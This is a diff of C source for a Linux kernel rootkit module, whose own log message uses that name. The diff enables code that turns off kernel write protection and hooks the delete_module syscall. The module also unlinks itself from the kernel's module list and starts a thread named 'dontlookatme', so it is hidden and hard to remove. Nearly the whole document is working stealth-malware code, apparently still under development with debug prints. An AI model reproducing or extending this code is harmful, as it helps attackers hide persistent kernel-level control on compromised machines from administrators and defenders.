@@ -21,10 +21,13 @@ static int hiding_thread(void * data){
   mutex_lock(&module_mutex);
   printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");
 
-  //disable_wp();
-  //orig_sys_delete_module = syscall_table[__NR_delete_module];
-  //syscall_table[__NR_delete_module] = my_delete_module;
-  //enable_wp();
+  disable_wp();
+  orig_sys_delete_module = syscall_table[__NR_delete_module];
+  syscall_table[__NR_delete_module] = my_delete_module;
+  enable_wp();
+
+  printk(KERN_INFO "module is live? %d\n", module_is_live(THIS_MODULE));
+  printk(KERN_INFO "module removable, task state: %ld\n", THIS_MODULE->waiter->state);
 
   tmp_head = THIS_MODULE->list.prev;	
   list_del(&THIS_MODULE->list);
@@ -44,22 +47,24 @@ void hide_code(void){
   kthread_run(hiding_thread, NULL, "dontlookatme");
 }
 
-void make_module_removable(void){
+int make_module_removable(void * data){
 	THIS_MODULE->mkobj.kobj = tmp_kobj;
   THIS_MODULE->sect_attrs = tmp_sect;
   THIS_MODULE->notes_attrs = tmp_notes;
 	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->mkobj.kobj.name);
+  printk(KERN_INFO "module is live? %d\n", module_is_live(THIS_MODULE));
+  printk(KERN_INFO "module removable, task state: %ld\n", THIS_MODULE->waiter->state);
 }
 
 int unhide_code(void * data) {
-  //disable_wp();
-  //syscall_table[__NR_delete_module] = orig_sys_delete_module;
-  //enable_wp();
-  printk(KERN_INFO "rootkit wants back to it's own kind\n");
-  mutex_lock(&module_mutex);
-  make_module_removable();
-  list_add(&THIS_MODULE->list, tmp_head);
-  mutex_unlock(&module_mutex);
+  disable_wp();
+  syscall_table[__NR_delete_module] = orig_sys_delete_module;
+  enable_wp();
+  //printk(KERN_INFO "rootkit wants back to it's own kind\n");
+  //mutex_lock(&module_mutex);
+  //make_module_removable();
+  //list_add(&THIS_MODULE->list, tmp_head);
+  //mutex_unlock(&module_mutex);
   return 0;
 }
 
